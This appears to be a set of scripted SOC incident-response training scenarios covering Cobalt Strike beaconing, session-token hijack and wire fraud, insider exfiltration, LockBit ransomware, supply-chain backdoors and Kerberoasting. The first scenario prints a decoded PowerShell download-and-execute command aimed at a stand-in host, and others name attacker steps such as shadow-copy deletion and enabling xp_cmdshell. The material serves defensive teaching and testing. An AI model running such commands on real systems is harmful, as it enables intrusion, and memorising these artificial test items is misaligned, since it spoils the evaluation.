turns.alert_text: SIEM Alert: Unusual outbound HTTPS traffic from DEV-WS-042. Process 'powershell.exe' is making periodic connections to 203.0.113.88:443 at 300-second intervals. No business justification found.
turns.analyst_prompt: Analyze this initial alert. What information do you need to determine if this is malicious?

turns.additional_context:
Process tree for powershell.exe on DEV-WS-042:
  explorer.exe (PID 1024)
  └─ winword.exe (PID 3308) — opened 'Project_Proposal.docx' 45 min ago
     └─ powershell.exe (PID 5540) -w hidden -enc [base64 string]
        └─ conhost.exe (PID 5541)

Decoded PowerShell: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.88/stage2')

Network: 203.0.113.88 flagged by 7/83 VirusTotal vendors. Domain: 'cdn-update-helper.net' registered 8 days ago.
turns.analyst_prompt: The process tree and decoded PowerShell are provided. What is the nature of this threat?

turns.additional_context:
Memory forensics on DEV-WS-042:
- Cobalt Strike beacon artifact found in powershell.exe process memory
- Beacon configuration: watermark=1234567890, sleep=300s, jitter=20%, C2=203.0.113.88
- Lateral movement detected: powershell.exe spawned PsExec to DEV-WS-041 and DEV-WS-043 at 14:22:07
- Both DEV-WS-041 and DEV-WS-043 now show same beacon traffic pattern

File: 'Project_Proposal.docx' contains malicious macro — VBA code with base64-encoded shellcode dropper.
turns.analyst_prompt: Lateral movement has been confirmed. How would you assess severity and what immediate containment is required?

turns.additional_context:
IR Team Update:
- dev.user9 received 'Project_Proposal.docx' via email from spoofed address 3 hours ago
- Check of email gateway shows 4 other employees received the same document
- 2 of them also opened it: DEV-WS-039 and DEV-WS-044 also beaconing
- Total compromised hosts: 5 (DEV-WS-039, DEV-WS-041, DEV-WS-042, DEV-WS-043, DEV-WS-044)
- Beacon has been active for 3 hours — attacker had extended dwell time
turns.analyst_prompt: You now have the full picture. Provide your final MITRE ATT&CK tactic, severity rating, and incident response summary.

title: CEO Email Compromise → Wire Fraud Investigation

turns.alert_text: Unusual activity on CEO account: ceo@corp.com authenticated from Moscow, Russia (IP 5.101.40.81) at 03:14 AM UTC while the CEO is known to be in New York. An email was sent to AP team requesting immediate wire transfer.
turns.analyst_prompt: Impossible travel alert received. Assess the situation.

turns.additional_context:
Email sent from CEO account at 03:14 AM to ap-team@corp.com:
  Subject: URGENT: Confidential Wire Transfer Required
  Body: 'Please process an immediate wire of $450,000 USD to the following account for an acquisition we are finalizing. This is time-sensitive and confidential — do not discuss with others. [Bank details attached]'

Azure AD sign-in logs:
- 02:47 AM — CEO normal sign-in from New York (IP 73.188.92.10) — MFA passed
- 02:51 AM — Session token issued
- 03:14 AM — New session from Moscow IP using SAME valid session token — no MFA required (token hijack)

MFA was NOT triggered for the second session because the first session token was reused.
turns.analyst_prompt: A session token was hijacked. What attack technique is being used and what is the scope?

turns.additional_context:
AP Team response:
- AP Manager received the wire request email and was suspicious
- AP Manager called CEO directly — CEO confirmed they did NOT send the email and are currently in New York
- Wire transfer has NOT been processed yet (still pending Manager approval)

Additional forensics:
- Adversary-in-the-Middle (AiTM) phishing kit identified: CEO clicked a link in a Tuesday email that proxied through 'corpauth-login.net' — recorded credentials AND session token
- 'corpauth-login.net' registered 4 days ago in Romania
- CEO's Outlook inbox now has a malicious rule forwarding all future emails to 'ceo.backup.account@tutanota.com'
turns.analyst_prompt: AiTM phishing is confirmed. What is the full attack chain and what must be done immediately?

turns.additional_context:
Status update:
- Wire transfer successfully blocked
- CEO account suspended pending full investigation
- Total emails accessed by attacker: 847 emails over 27 minutes (including M&A discussions, board communications)
- Email forwarding rule deleted
- Second forensic finding: attacker also accessed CEO's calendar and SharePoint for the past 6 months

Discovery suggests attacker may have been inside CEO's account in read-only mode for 6 months before attempting financial fraud.
turns.analyst_prompt: The full scope is now known. Provide MITRE ATT&CK tactic, severity, and comprehensive incident response.

turns.alert_text: DLP Alert: USB storage device 'SanDisk Ultra 64GB' (Serial: 4C530200030522116282) connected to WKSTN-ENG-114 at 17:42 — outside normal business hours. User: eng.zhang. Last USB connection for this user: 8 months ago. No files transferred in this session.
turns.analyst_prompt: A USB was connected outside business hours. Is this notable and what follow-up do you recommend?

turns.additional_context:
Next day — DLP Alert: Same USB device reconnected to WKSTN-ENG-114 at 18:55 (after most staff have left). This time, file transfer activity detected:

Files copied to USB:
- /src/proprietary_algo_v7_FINAL.py (47 MB) — marked CONFIDENTIAL
- /models/trained_model_weights_prod.pkl (1.2 GB) — marked TOP SECRET
- /docs/patent_pending_architecture.pdf (8 MB) — marked CONFIDENTIAL
- /data/customer_dataset_anonymized.csv (340 MB)

HR note: eng.zhang gave notice 3 weeks ago. Last day is Friday. Exit interview is tomorrow morning.
turns.analyst_prompt: Significant IP exfiltration has occurred by an employee on notice. How do you classify and respond?

turns.additional_context:
Investigation findings:
- Security review of eng.zhang's recent activity shows: over last 3 weeks, accessed 340% more files than their 6-month baseline
- Git clone of entire private repository 2 weeks ago (never done before)
- LinkedIn profile updated to show new employer (competitor company) 10 days ago
- USB serial number not in approved device inventory
- Files copied include next-generation algorithm not yet published — estimated IP value: $15–$50 million

Legal has been briefed. They want to proceed quietly to gather full forensic evidence before confronting the employee.
turns.analyst_prompt: Provide final MITRE ATT&CK classification, severity, and the careful containment strategy balancing evidence preservation vs. business risk.

turns.alert_text: EDR Alert: Domain admin credentials used outside of business hours. 'corp\da_admin2' authenticated to 12 servers between 02:00 and 02:30 AM from WKSTN-HR-031. This account is normally used only during planned maintenance windows (last window: 3 weeks ago). WMI remote execution activity detected on each target server.
turns.analyst_prompt: Off-hours domain admin lateral movement detected. What is your initial assessment?

turns.additional_context:
Forensics on WKSTN-HR-031:
- Domain admin password found in cleartext in 'C:\Users\hr31user\AppData\Local\Temp\password_list.txt'
- hr31user's workstation was compromised 6 days ago via a phishing email with a macro dropper
- Attacker installed a keylogger that captured da_admin2 password when IT performed maintenance

Actions performed by attacker via WMI on 12 servers:
- Disabled Windows Defender real-time protection
- Disabled Windows Update service
- Disabled backup services
- Installed remote monitoring tool 'AnyDesk' for persistent access

No encryption or destruction has occurred yet.
turns.analyst_prompt: Pre-ransomware staging is confirmed. What is the immediate priority and how do you respond without triggering the attack?

turns.additional_context:
CRITICAL UPDATE — 03:47 AM:
Ransomware encryption has begun on FILESVR-02 and FILESVR-03.
Vssadmin deleting shadow copies on all 12 servers simultaneously.
File extension being changed to '.encrypted_LockBit3'
Ransom note dropped in C:\ransom_note.txt: 'Your network has been compromised by LockBit 3.0. Pay 50 BTC within 72 hours. Contact: [dark web URL]'

Status of 12 servers:
- 4 fully encrypted (file shares offline)
- 5 currently encrypting (IO spike visible)
- 3 not yet started (may still be stoppable)

HR-031 user (hr31user) has been reached by phone — they have no knowledge of any of this.
turns.analyst_prompt: Active ransomware encryption is underway. What is your emergency response protocol for the 3 servers not yet encrypted?

turns.additional_context:
IR Response Status:
- 3 remaining servers successfully isolated before encryption began
- 9 servers remain encrypted — 23 TB of business data affected
- Finance and HR file shares are completely offline
- Backups: last clean backup is 48 hours old, stored in immutable Azure Blob container (not accessed by attacker — offline backup strategy saved us)
- CEO has been briefed. Board meeting called for 9 AM.
- Legal counsel engaged. Cyber insurance carrier notified.
- Decision pending: pay ransom or restore from backup?

Restoration estimate from backup: 3–4 days for full recovery.
turns.analyst_prompt: Provide full incident classification, the pay-vs-restore analysis, and your recommended recovery strategy.

title: False Positive — Red Team Exercise Simulation

turns.alert_text: SIEM Correlation: Multiple high-severity indicators triggered simultaneously on subnet 10.50.0.0/24: (1) Port scanning from 10.50.0.5; (2) Mimikatz signatures on 10.50.0.12; (3) BloodHound AD enumeration from 10.50.0.7; (4) Lateral movement via PsExec between 10.50.0.5 and 10.50.0.20. All activity began at exactly 09:00 AM.
turns.analyst_prompt: Multiple serious indicators firing simultaneously at exactly 9 AM. What is your immediate assessment?

turns.additional_context:
Lookup results:
- Subnet 10.50.0.0/24 is the Security Lab / Red Team segment (isolated VLAN)
- Host 10.50.0.5 is RT-KALI-001, registered in asset inventory as Red Team workstation
- CMDB entry for RT-KALI-001: 'Authorized Penetration Testing Platform — do not quarantine'
- Change management ticket CHG-2025-0487 approved by CISO: 'Monthly Red Team Exercise — Q1 Assessment — March 1-5, 2025 09:00-17:00'
- Today is March 3, 2025 (within the authorized window)
- All activity is on isolated segment — no production network traffic
turns.analyst_prompt: Context shows this is on the red team segment during an authorized exercise window. How do you proceed?

turns.additional_context:
Verification complete:
- Called Red Team lead (Marcus Webb, ext 5521) — confirmed active exercise is in progress
- All indicators are expected artifacts of the exercise
- Red Team is testing SOC detection capabilities (meta: they were testing whether SOC would correctly identify this as authorized)
- SIEM rules need tuning to suppress red team segment alerts during authorized windows

Action taken: Alert marked as false positive, authorized activity. Recommended SIEM improvement: Add suppression rule for 10.50.0.0/24 during approved change windows.
turns.analyst_prompt: Provide your final classification and any process improvement recommendations.

title: Supply Chain Compromise via Software Update

turns.alert_text: Threat intelligence feed alert: Vendor 'NetManage Pro' (a network monitoring tool deployed on 47 of our servers) has released an emergency advisory. Version 6.2.1 (deployed 3 days ago via auto-update) contains a backdoor. The backdoor establishes a persistent connection to 'update.netmanage-cloud.net'. IOC: process 'nmpsvc.exe' making outbound connections to 185.220.101.55:8443.
turns.analyst_prompt: A supply chain compromise has been disclosed. What is your immediate triage priority?

turns.additional_context:
Internal investigation findings:
- Confirmed: NetManage Pro v6.2.1 auto-updated on 47 of our servers 3 days ago
- 47 servers include: 12 DMZ servers, 8 database servers, 15 application servers, 12 internal servers
- Process nmpsvc.exe confirmed on all 47 servers — all are beaconing to 185.220.101.55
- Backdoor has been active for 72 hours — attacker had full system access as SYSTEM on all 47 servers
- Network traffic analysis: 1.8 GB of outbound data from DB server cluster during this period
- Vendor: NetManage Pro has released a clean version 6.2.2 and has reported the incident to CISA
turns.analyst_prompt: 47 servers compromised, including database servers with potential data exfiltration. How do you scope and prioritize remediation?

turns.additional_context:
Forensic analysis results:
- Attacker accessed database servers SRV-DB-01 through SRV-DB-04 (47+ million customer records)
- Evidence of SQL queries run: SELECT * FROM customers, SELECT * FROM payment_methods
- 1.8 GB exfiltrated data likely contains customer PII and payment information
- Backdoor also created a new local admin account 'nmpsupport' on all 47 servers
- No evidence of further lateral movement beyond the 47 compromised servers

This triggers GDPR Article 33 notification (72-hour deadline to notify supervisory authority) and potentially CCPA requirements.
turns.analyst_prompt: Data breach is confirmed. Provide MITRE classification, regulatory notification strategy, and full remediation plan.

turns.alert_text: IDS Alert: Abnormal Kerberos TGS request pattern from WKSTN-FIN-088. 223 TGS_REQ for service tickets within 45 seconds. Source: john.reeves (Finance analyst). Normal baseline for this account: 3–5 service ticket requests per day. Domain controller logs confirm all requests.
turns.analyst_prompt: High-volume Kerberos TGS requests detected. What is your assessment?

turns.additional_context:
EDR forensics on WKSTN-FIN-088:
- Rubeus.exe (Kerberoasting tool) executed from C:\Users\Public\Downloads\rubeus.exe at 11:23:07 AM
- File hash: b94f5a980ec40d9a4eba2b9db4b9d5c7 — matches known Rubeus v2.2.0
- 223 service tickets captured in file 'C:\Users\Public\Downloads\tickets.kirbi'
- john.reeves account: Finance analyst, no privileged access, employee for 3 years
- john.reeves opened email attachment 'Benefits_Update_2025.pdf.exe' at 11:19 AM (4 min before Rubeus)
- The attacker is operating as john.reeves but the initial access was via phishing

Tickets exported include: MSSQLSvc (mssql@corp.com), HTTP/webapp01, LDAP/DC01, BackupSvc@corp.com
turns.analyst_prompt: Rubeus confirmed, phishing initial access. What are the high-risk SPNs being targeted and what is the escalation risk?

turns.additional_context:
Offline password cracking results (security team recovered the ticket file):
- MSSQLSvc@corp.com — password cracked in 3 minutes (weak password: 'Summer2022!')
- HTTP/webapp01 — NOT cracked (strong password)
- BackupSvc@corp.com — password cracked in 47 minutes ('Backup$2023')

SIEM Log: 30 minutes after Kerberoasting — new logon event on SRV-DB-01 using MSSQLSvc account from the same workstation. SQL Server commands executed include: xp_cmdshell enabled, new sysadmin account 'dbm_support' created.

Attacker now has full database server access and has potentially pivoted.
turns.analyst_prompt: Privilege escalation to database server is confirmed. Provide MITRE ATT&CK classification, severity, and containment plan.

turns.alert_text: Firewall + EDR combined alert: Jenkins CI server (10.40.0.50) is: (1) SSH-ing into 25 production servers within 5 minutes; (2) Downloading packages from multiple external repos (PyPI, npm, Docker Hub); (3) Running elevated commands via sudo on all target servers; (4) Spawning Python and Node.js processes. Traffic volume: 4.2 GB inbound from internet.
turns.analyst_prompt: Mass SSH connections and external package downloads from CI server. How do you triage this?

turns.additional_context:
CMDB lookup for JENKINS-PROD-01:
- Authorized CI/CD server — Jenkins v2.440.1
- Scheduled deployment job: 'prod-release-v3.4.1' triggered at 14:00 UTC (matches alert time)
- Change management: CHANGE-2025-0341 approved, deployment window 14:00-16:00 UTC today
- svc_jenkins account: Service account with sudo rights scoped to deployment scripts only
- External downloads: All from approved dependency mirrors in allowlist
- All 25 target servers are in the prod application cluster (expected)

Runbook: This is standard deployment behavior. Same pattern runs every 2 weeks.
turns.analyst_prompt: All context confirms this is authorized. Provide your final classification and any tuning recommendations.
